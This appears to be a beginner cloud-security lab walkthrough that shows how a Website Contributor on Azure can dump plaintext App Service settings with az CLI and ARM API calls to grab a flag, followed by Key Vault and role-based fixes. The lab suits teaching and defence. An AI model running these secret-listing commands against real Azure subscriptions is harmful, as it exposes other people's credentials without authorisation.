# App Service Environment Variables — Secret Exposure

**Difficulty:** Beginner | **Provider:** Azure | **Category:** Web / Secrets

## Scenario

A team deployed a Python web app on Azure App Service and stored credentials directly
in **Application Settings** (environment variables). While this is convenient, any
identity with `Microsoft.Web/sites/config/list` can retrieve all settings in plaintext
via the ARM API — including database passwords and API keys.

The attacker account has been granted **Website Contributor** on the resource group,
which includes the `listConfigs` action.

## Attack Path

```
[Attacker] Azure AD user (Website Contributor on RG)
    |
    v
az webapp config appsettings list  -->  returns all app settings as JSON
    |
    v
SECRET_FLAG value  -->  flag
```

### Step 1 — Login as the attacker

```bash
az login --username <attacker_upn> --password <attacker_password>
```

### Step 2 — List the App Service configuration

```bash
RESOURCE_GROUP="<resource_group_name>"
APP_NAME="<app_service_name>"

az webapp config appsettings list \
  --name "${APP_NAME}" \
  --resource-group "${RESOURCE_GROUP}" \
  --output table
```

### Step 3 — Extract the flag

```bash
az webapp config appsettings list \
  --name "${APP_NAME}" \
  --resource-group "${RESOURCE_GROUP}" \
  --query "[?name=='SECRET_FLAG'].value" \
  --output tsv
```

### Alternative — ARM REST API

```bash
# Get access token
TOKEN=$(az account get-access-token --query accessToken -o tsv)
SUBSCRIPTION_ID=$(az account show --query id -o tsv)

curl -s -X POST \
  "https://management.azure.com/subscriptions/${SUBSCRIPTION_ID}/resourceGroups/${RESOURCE_GROUP}/providers/Microsoft.Web/sites/${APP_NAME}/config/appsettings/list?api-version=2022-03-01" \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" | jq '.properties'
```

## How to Fix in Production

1. **Use Azure Key Vault references** in App Service settings instead of plaintext values:
   ```
   @Microsoft.KeyVault(SecretUri=https://myvault.vault.azure.net/secrets/MySecret/)
   ```
2. **Use Managed Identity** to authenticate to Key Vault — no credentials in config at all.
3. **Restrict `Microsoft.Web/sites/config/list`** — it is included in many built-in roles.
   Create a custom role that omits this action for non-operators.
4. **Audit app settings** across all App Services:
   ```bash
   az webapp list --query "[].{Name:name,RG:resourceGroup}" -o tsv | \
     while read name rg; do az webapp config appsettings list -n "$name" -g "$rg"; done
   ```
5. **Rotate any secret that was stored in App Settings** — treat it as compromised.

## MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Unsecured Credentials: Credentials in Files | [T1552.001](https://attack.mitre.org/techniques/T1552/001/) |
| Cloud Infrastructure Discovery | [T1580](https://attack.mitre.org/techniques/T1580/) |
| Valid Accounts: Cloud Accounts | [T1078.004](https://attack.mitre.org/techniques/T1078/004/) |
